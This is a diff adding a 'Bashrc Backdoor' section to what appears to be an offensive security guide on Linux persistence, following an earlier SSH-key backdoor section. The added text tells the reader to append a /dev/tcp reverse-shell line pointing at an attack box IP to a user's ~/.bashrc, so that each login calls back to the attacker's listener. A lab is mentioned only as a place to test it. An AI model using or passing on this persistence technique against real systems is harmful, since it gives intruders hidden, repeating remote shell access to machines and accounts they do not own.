@@ -39,3 +39,24 @@ Now to utilize the backdoor all you have to do is ssh to the target box and no m
 Note: make sure to use -i [private key file] in your ssh command to specify you want to make use of key authentication.\
 
 # //------------------------------------
+# Bashrc Backdoor
+The .bashrc file, located in every user's home directory is rarely checked by the average user, making this one of my favorite spots to stick a backdoor.\
+\
+Ensure you are in your user’s home directory by issuing the command:\
+\
+cd ~\
+\
+Now that you are in their home directory simply echo the following and direct the output to append(not overwrite the .bashrc file):\
+\
+echo ‘bash -i >& /dev/tcp/[attack box ip address]/[port] 0>&1’ >> ~/.bashrc\
+\
+Confirm the aforementioned command completed successfully my examining the end of the .bashrc file with:\
+\
+tail ~/.bashrc\
+\
+With that established, all that is left to do is set up a listener. Now every time that user logs in to the box it will call out to your attack box on the specified port number! To simulate this in a lab environment simply exit the ssh session and re-login with the key persistence we set up earlier. This login will trigger the reverse shell to call out.\
+imagehere\
+
+# //------------------------------------
+
+
